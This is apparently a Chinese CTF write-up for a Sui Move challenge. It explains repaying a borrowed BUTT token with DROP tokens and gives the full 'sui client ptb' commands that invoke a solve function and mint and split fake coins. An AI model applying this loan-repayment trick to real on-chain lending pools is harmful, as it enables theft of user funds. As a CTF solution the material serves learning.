# 解题思路:
借出 BUTT 代币,归还 DROP 代币

注意事项:
TOML 文件中要指定依赖的的 CTF 合约地址,同时把该合约源码放在 GitHub 上,或者在本地也行


# 完整 ptb 命令
```
sui client ptb \
--assign challenge_package @0x51549e2b6e9896c39c5e2060d3d1b2e9609d97324aaa9eb9093912694fff3517 \
--assign hacker_package @0xe007c665c9b1636a16e15f8a7f5e7c7fd55f24acece81148e031aaf24a810043 \
--assign create_pool_cap @0x1e7b824da8b92246f5d45ebd3abcc66f607ea4d5b8d8bbbd629e7f10512ed3be \
--assign mint_butt @0x182a783959bc300e5c8871ad270d319cc7b9a41b8e2d0db5f13d3bd10b8ca781 \
--assign mint_drop @0xb347c431206bddc4d148391f4e865192c10c6269296587ad9560811c3a360345 \
--move-call hacker_package::hacker::solve mint_butt mint_drop create_pool_cap
```

## ptb demo
```
sui client ptb \
--assign fake_butt_package_id @0xd729e8b7bd00ec790150eb35b3a514217b944e6917625985c91c70bbee513b73 \
--assign my_acc @0xc494732d09de23389dbe99cb2f979965940a633cf50d55caa80ed9e4fc4e521e \
--move-call fake_butt_package_id::fakebutt::mint_for_pool "<0xd729e8b7bd00ec790150eb35b3a514217b944e6917625985c91c70bbee513b73::fakebutt::FAKEBUTT>" @0x0da68f4ab54061c48aea4f8c139abe3e4f82feb33ea897345eef10f63affe53a \
--assign fakecoins \
--split-coins fakecoins "[1,2]" \
--assign splitfakecoins \
--transfer-objects "[fakecoins,splitfakecoins.0,splitfakecoins.1]" my_acc
```

## ptb 注意事项
- 1.中间值(如 fakecoins)不用 transfer 给某个人,只要接下来有处理逻辑(消耗or转移)即可
- 2.换行符号不需要空格